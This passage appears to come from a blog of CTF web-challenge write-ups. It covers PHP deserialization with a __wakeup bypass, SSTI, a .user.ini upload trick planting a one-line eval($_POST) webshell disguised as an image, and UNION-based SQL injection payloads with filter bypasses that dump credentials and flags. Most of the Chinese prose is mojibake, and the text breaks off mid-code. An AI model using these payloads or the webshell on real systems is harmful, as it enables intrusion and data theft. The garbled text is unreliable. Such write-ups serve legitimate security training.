´</p><h2 id="22-easy-unser"><a href="#22-easy-unser" class="headerlink" title="22.easy_unser"></a>22.easy_unser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;f14g.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>,<span class="variable">$todonothing</span> = <span class="string">&quot;i can&#x27;t get you want,But you can tell me before I wake up and change my mind&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is created,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>) <span class="variable language_">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;want = <span class="variable language_">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is unserialized,I will be called&quot;</span>;</span><br><span class="line">        <span class="variable">$but</span> = <span class="string">&quot;I can CHANGE you&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt; want = <span class="variable">$but</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;C1ybaby!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;So,let me see if you can get what you want\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;todonothing === <span class="variable language_">$this</span>-&gt;want)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;é²å‹ƒ,åˆ«å‚»æ„£ç€!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;I can CHANGE you&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You are not you....&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;f14g.php&quot;</span> OR <span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;want))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You want my heart?No way!\n&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You got it!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;want);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">unserializeorder</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$CORE</span> = <span class="string">&quot;äººç±»æœ€å¤§çš„æ•Œäºº,å°±æ˜¯æ— åº. Yahi param vaastavikta hai!&lt;BR&gt;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is serialized,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is used as a string,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;CORE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">unserializeorder</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ywant</span> = @<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$ywant</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">äººç±»æœ€å¤§çš„æ•Œäºº,å°±æ˜¯æ— åº. Yahi param vaastavikta hai!</span><br><span class="line">We Come To HNCTF,Enjoy the ser14l1zti0n</span><br></pre></td></tr></table></figure><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p> æ˜¯å°† PHP å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„è¿‡ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ serialize() å‡½æ•°æ¥å®ç°ã€‚è¯¥å‡½æ•°å°†å¯¹è±¡çš„çŠ¶æ€ä»¥åŠå®ƒçš„ç±»åå’Œå±æ€§å€¼ç¼–ç ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å¯ä»¥å­˜å‚¨åœ¨æ–‡ä»¶ä¸­ï¼Œå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œæˆ–è€…é€šè¿‡ç½‘ç»œä¼ è¾“åˆ°å…¶ä»–åœ°æ–¹ã€‚</p><p><a href="https://">https://www.bilibili.com/video/BV1GN4y1c7ut/?spm_id_from&#x3D;333.337.search-card.all.click&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>,<span class="variable">$todonothing</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is created,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>) <span class="variable language_">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;want = <span class="variable language_">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=f14g.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">body</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/:2:&#123;/&quot;</span>,<span class="string">&quot;:3:&#123;&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="901aacec5c9e8f412935b1b1d82ee2df.png" alt="901aacec5c9e8f412935b1b1d82ee2df.png" /><img src="ddf40e1c15fcf00cddda177797c0b080.png" alt="ddf40e1c15fcf00cddda177797c0b080.png" /><h2 id="23-çœ‹çœ‹ip"><a href="#23-çœ‹çœ‹ip" class="headerlink" title="23.çœ‹çœ‹ip"></a>23.çœ‹çœ‹ip</h2><img src="e78ab70aec28838ebc8bb91f50c10425.png" alt="e78ab70aec28838ebc8bb91f50c10425.png" /><p>IPæ˜¯çº¿ç´¢</p><p>åŠ ä¸€å€‹X-Forwarded-For </p><p>æ˜¯&#123;&#123;&#125;&#125; æ¨¡æ¿æ³¨å…¥</p><img src="07c07948454ee7ffc48f71d2eef2732d.png" alt="07c07948454ee7ffc48f71d2eef2732d.png" /><img src="73975aaedff0f314a228b66e81360da9.png" alt="73975aaedff0f314a228b66e81360da9.png" /><img src="02fe2b5fd3b0159f32acd93815881dfa.png" alt="02fe2b5fd3b0159f32acd93815881dfa.png" /><h2 id="24-æ€ä¹ˆå¤šäº†ä¸ªæ²¡ç”¨çš„phpæ–‡ä»¶"><a href="#24-æ€ä¹ˆå¤šäº†ä¸ªæ²¡ç”¨çš„phpæ–‡ä»¶" class="headerlink" title="24.æ€ä¹ˆå¤šäº†ä¸ªæ²¡ç”¨çš„phpæ–‡ä»¶"></a>24.æ€ä¹ˆå¤šäº†ä¸ªæ²¡ç”¨çš„phpæ–‡ä»¶</h2><img src="e715b46d3754d888ea7138fafc0bafe2.png" alt="e715b46d3754d888ea7138fafc0bafe2.png" /><img src="69a1a0687d44b0021a45a50f3ac70355.png" alt="69a1a0687d44b0021a45a50f3ac70355.png" /><p>å¯ä»¥çœ‹è¦‹åœ¨uploadsæ–‡ä»¶å¤¾ä¸‹æœ‰, å€‹notion.php</p><img src="17919fb51068948349cf90f788b55f77.png" alt="17919fb51068948349cf90f788b55f77.png" /><p>èšå‰‘ fuzz</p><p>æœåŠ¡å™¨æ˜¯ nginx ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ htaccess(è¶…æ–‡ä»¶)</p><img src="a8ae227886464f5d88225ca1e48e38b8.png" alt="a8ae227886464f5d88225ca1e48e38b8.png" /><h3 id="Apache-çš„-htaccess-æœºåˆ¶"><a href="#Apache-çš„-htaccess-æœºåˆ¶" class="headerlink" title="Apache çš„ .htaccess æœºåˆ¶"></a>Apache çš„ .htaccess æœºåˆ¶</h3><ul><li>åˆ†å¸ƒå¼é…ç½®ï¼šApache è¢«è®¾è®¡ä¸ºå…è®¸åœ¨æ¯ä¸ªç›®å½•ä¸‹æ”¾ç½®ä¸€ä¸ª .htaccess æ–‡ä»¶ã€‚</li><li>è¿è¡Œæ—¶è¯»å–ï¼šå½“æ”¶åˆ°ä¸€ä¸ªè¯·æ±‚æ—¶ï¼ŒApache ä¼šä»ç½‘ç«™æ ¹ç›®å½•å¼€å§‹ï¼Œä¸€è·¯å‘ä¸ŠæŸ¥æ‰¾å¹¶è§£ææ¯ä¸€çº§ç›®å½•ä¸‹çš„ .htaccess æ–‡ä»¶ï¼Œç„¶åå®æ—¶åº”ç”¨å…¶ä¸­çš„è§„åˆ™ã€‚</li><li>ä¼˜ç‚¹ï¼šæ–¹ä¾¿å…±äº«ä¸»æœºç”¨æˆ·åœ¨ä¸æ¥è§¦ä¸»é…ç½®æ–‡ä»¶çš„æƒ…å†µä¸‹ä¿®æ”¹é…ç½®ã€‚</li><li>ç¼ºç‚¹ï¼šæ€§èƒ½æœ‰å¼€é”€ï¼Œå› ä¸ºæ¯ä¸ªè¯·æ±‚éƒ½å¯èƒ½è¦è¯»å–å¤šä¸ªæ–‡ä»¶ã€‚</li></ul><h3 id="Nginx-çš„é…ç½®"><a href="#Nginx-çš„é…ç½®" class="headerlink" title="Nginx çš„é…ç½®"></a>Nginx çš„é…ç½®</h3><ul><li>é›†ä¸­å¼é…ç½®ï¼šNginx æ²¡æœ‰ç±»ä¼¼ .htaccess çš„æœºåˆ¶ã€‚å®ƒçš„æ‰€æœ‰é…ç½®éƒ½é›†ä¸­åœ¨ä¸€ä¸ªä¸»é…ç½®æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ nginx.confï¼‰ä»¥åŠé€šè¿‡ include æŒ‡ä»¤å¼•å…¥çš„å…¶ä»–é…ç½®æ–‡ä»¶ä¸­ã€‚</li><li>å¯åŠ¨æ—¶åŠ è½½ï¼šNginx åœ¨å¯åŠ¨æˆ–é‡è½½æ—¶ï¼Œä¼šä¸€æ¬¡æ€§è¯»å–å¹¶ç¼–è¯‘æ‰€æœ‰é…ç½®ï¼Œå½¢æˆä¸€ä¸ªé«˜æ•ˆçš„é…ç½®æ ‘ã€‚</li><li>ä¼˜ç‚¹ï¼šæ€§èƒ½æé«˜ï¼Œå› ä¸ºå¤„ç†è¯·æ±‚æ—¶ä¸éœ€è¦å†å»æ–‡ä»¶ç³»ç»Ÿé‡ŒæŸ¥æ‰¾å’Œè§£æé¢å¤–çš„é…ç½®æ–‡ä»¶ã€‚</li><li>ç¼ºç‚¹ï¼šç”¨æˆ·å¿…é¡»èƒ½è®¿é—®æœåŠ¡å™¨é…ç½®æ–‡ä»¶ï¼Œæˆ–è€…åœ¨ server å—å†…æ‹¥æœ‰å†™å…¥æƒé™ï¼ˆä¾‹å¦‚é€šè¿‡æ§åˆ¶é¢æ¿ï¼‰</li></ul><p>å¯«ä¸€ä¸‹: auto_prepend_file &#x3D; 1.png</p><p>æ”¹æˆ.user.iniæ–‡ä»¶</p><p>ç”¨BPæŠ“åŒ… , ä¸Šå‚³iniæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.user.ini</span><br><span class="line">auto_prepend_file=xxx è¡¨ç¤ºåœ¨æ–‡ä»¶é ­åŒ…å«</span><br><span class="line">auto_append_file=xxx è¡¨ç¤ºåœ¨æ–‡ä»¶å°¾åŒ…å«</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto_prepend_file=1.jpg</span><br></pre></td></tr></table></figure><p>.user.iniæ–‡ä»¶æ˜¯ä¸€ç¨®æ—¥å¿—åŒ…å« , ç„¶å¾Œåœ¨è¨ªå•çš„æ™‚å€™uaåŠ ä¸Šä¸€å¥è©±, å†ä¸Šå‚³ä¸€å€‹phpæ–‡ä»¶ä¾†é€²è¡Œä¸€å€‹åŒ…å«ã€‚</p><img src="b9623524e79975298235b69e9ddb8e97.png" alt="b9623524e79975298235b69e9ddb8e97.png" /><p>å†ä¸Šå‚³ä¸€å¥è©±æœ¨é¦¬ 1.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;123&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“notion.phpåŒ…å«äº†ä¸Šé¢çš„ä»£ç¢¼, ç”¨notion.phpé€£ç·š:</p><img src="64a4dbb9c2cc139206a9233aaa925ead.png" alt="64a4dbb9c2cc139206a9233aaa925ead.png" /><img src="a770e99ebcab1e349cb7e231a2b5f1e3.png" alt="a770e99ebcab1e349cb7e231a2b5f1e3.png" /><img src="8cc9167e7d7a68e18fa21af218e726e7.png" alt="8cc9167e7d7a68e18fa21af218e726e7.png" /><br/><img src="55e24b74ad632bb9d989ef7a1bc54d4e.png" alt="55e24b74ad632bb9d989ef7a1bc54d4e.png" /><p>NSSCTF{213a5655-425e-4ac9-b0bd-32f9e6ea9af4}</p><h2 id="25-UploadBaby"><a href="#25-UploadBaby" class="headerlink" title="25.UploadBaby"></a>25.UploadBaby</h2><p>å¯æ¶çš„å‰ç«¯ï¼Œä¸è®©æˆ‘ä¼ word é©¬ï¼ŒæŠŠä½ æ‰¬äº†å°±è€å®äº†</p><img src="79d8ae6d5190ad9b97e4ac828c647c0b.png" alt="79d8ae6d5190ad9b97e4ac828c647c0b.png" /><img src="176c7a599d2243f544194ea825785c48.png" alt="176c7a599d2243f544194ea825785c48.png" /><p><a href="http://node6.anna.nssctf.cn:29933/uploads/1.php">http://node6.anna.nssctf.cn:29933/uploads/1.php</a></p><img src="038c210cb9ebb9c7215a35440029c686.png" alt="038c210cb9ebb9c7215a35440029c686.png" /><img src="b65a95273debd8677d7b34f1e4a9f167.png" alt="b65a95273debd8677d7b34f1e4a9f167.png" /><h2 id="26-ez-sql"><a href="#26-ez-sql" class="headerlink" title="26.ez_sql"></a>26.ez_sql</h2><img src="22c4a7ca350c2e376f7fa15a302be6ae.png" alt="22c4a7ca350c2e376f7fa15a302be6ae.png" /><p>ç›¸å¯¹å®‰å…¨çš„æ–¹å¼ä¼ å‚?????</p><img src="bf8307cd110d03d41a1c9d56e01f6146.png" alt="bf8307cd110d03d41a1c9d56e01f6146.png" /><img src="a2baabd2b65aa66654c5b9844891b59c.png" alt="a2baabd2b65aa66654c5b9844891b59c.png" /><img src="ea2230b1eec711aa501065f0294f173d.png" alt="ea2230b1eec711aa501065f0294f173d.png" /><p>åˆ¤æ–­åˆ—æ•°å…ˆ</p><p>åŒå†™å‘½ä»¤ç»•è¿‡:<br><img src="f714aaf2dcedaab4bfdb6915775046b1.png" alt="f714aaf2dcedaab4bfdb6915775046b1.png" /></p><p>åˆ—æ•°ä¸º3</p><p>åˆ¤æ–­æ˜¾ç¤ºä½</p><img src="66831d116f87b5c4f1165d2d51722e4e.png" alt="66831d116f87b5c4f1165d2d51722e4e.png" /><p>å°è¯•æŸ¥çœ‹ç¬¬äºŒè¡Œ</p><img src="de806c50d12a11da6d7fc221662342ca.png" alt="de806c50d12a11da6d7fc221662342ca.png" /><p>æŸ¥è¯¢æ•°æ®åº“å</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),(select/**/group_concat(schema_name)/**/from/**/infoorrmation_schema.schemata)/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="e12f0d6df8aa9cf805081a86bde10b4b.png" alt="e12f0d6df8aa9cf805081a86bde10b4b.png" /><p>æŸ¥è¯¢è¡¨å</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="28bc8935b945fdd395b45c46fb511689.png" alt="28bc8935b945fdd395b45c46fb511689.png" /><p>æŸ¥è¯¢è¡¨å†…å­—æ®µå</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;NSS_tb&#x27;/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="fda0853ed31d9dc989a0db1275038c06.png" alt="fda0853ed31d9dc989a0db1275038c06.png" /><p>æŸ¥è¯¢å­—æ®µå†…å®¹</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),group_concat(id,Secr3t,flll444g)/**/from/**/NSS_tb/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="5c1ff72d0d1a5408606592c551d1a663.png" alt="5c1ff72d0d1a5408606592c551d1a663.png" /><h2 id="27-è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL-ï¼æ³¨ä¸€ä¸‹-ï¼"><a href="#27-è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL-ï¼æ³¨ä¸€ä¸‹-ï¼" class="headerlink" title="27.è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL ï¼æ³¨ä¸€ä¸‹ ï¼"></a>27.è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL ï¼æ³¨ä¸€ä¸‹ ï¼</h2><img src="ea14253c98c1786d496d367c75cd16f4.png" alt="ea14253c98c1786d496d367c75cd16f4.png" /><p>å¯ä»¥çœ‹è¦‹sqlä»£ç¢¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT username,password FROM users WHERE id = &quot;</span>.<span class="string">&#x27;((((((&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&#x27;))))))&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>è¼¸å…¥ä¸€å€‹1å¯ä»¥çœ‹åˆ° </p><img src="99609d6114112c4c69c7f32084313877.png" alt="99609d6114112c4c69c7f32084313877.png" /><p>æ¨æ–­æ˜¯ä¸¤ä¸ªå­—æ®µ :</p><p>username &#x3D; tanji       password &#x3D; OHHHHHHH</p><p>select ä¸€ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><img src="2b713b584e3eb2d5439ed2511444aa0e.png" alt="2b713b584e3eb2d5439ed2511444aa0e.png" /><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><img src="1bbda58f59d944576882ba282830fa45.png" alt="1bbda58f59d944576882ba282830fa45.png" /><p>æ‰€æœ‰æ•°æ®åº“åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(schema_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">-- </span></span><br></pre></td></tr></table></figure><img src="a8b299b36cfae6217bddbd68cc1dc711.png" alt="a8b299b36cfae6217bddbd68cc1dc711.png" /><p>ctfçš„è¡¨åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure><img src="3abceb620f2d24e7d68dc4cca18c16f6.png" alt="3abceb620f2d24e7d68dc4cca18c16f6.png" /><p>æŸ¥usersè¡¨ä¸­çš„å­—æ®µå:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> #</span><br></pre></td></tr></table></figure><img src="d6512debb874046d84a88bfcce76a388.png" alt="d6512debb874046d84a88bfcce76a388.png" /><p>æŸ¥usersè¡¨ä¸­æ•°æ®ï¼š</p><p>0x7e &#x3D; ~ (æ³¢æµªè™Ÿ)åå…­é€²åˆ¶ç·¨ç¢¼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(id,<span class="number">0x7e</span>,username,<span class="number">0x7e</span>,password),<span class="number">2</span> <span class="keyword">from</span> users # </span><br></pre></td></tr></table></figure><img src="3b85731201687b978cf3059081b2057d.png" alt="3b85731201687b978cf3059081b2057d.png" /><p>å†çœ‹å…¶ä»–æ•°æ®åº“ï¼Œè¿˜æœ‰ä¸€ä¸ªctftrainingæ•°æ®åº“:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span> #</span><br></pre></td></tr></table></figure><img src="e7f4930394bb7c639d7fd61d9c7c7218.png" alt="e7f4930394bb7c639d7fd61d9c7c7218.png" /><p>å…ˆæŸ¥flagè¡¨çš„å­—æ®µï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>#</span><br></pre></td></tr></table></figure><img src="88becf32643c762cdb4ad11246d44287.png" alt="88becf32643c762cdb4ad11246d44287.png" /><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> flag,<span class="number">2</span> <span class="keyword">from</span> ctftraining.flag #</span><br></pre></td></tr></table></figure><img src="28257c2a109f722a3b1374fb21ed961a.png" alt="28257c2a109f722a3b1374fb21ed961a.png" /><h2 id="28-ç†æƒ³å›½"><a href="#28-ç†æƒ³å›½" class="headerlink" title="28.ç†æƒ³å›½"></a>28.ç†æƒ³å›½</h2><p>çµ¦äº†ä¸€å€‹jsonæª”:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 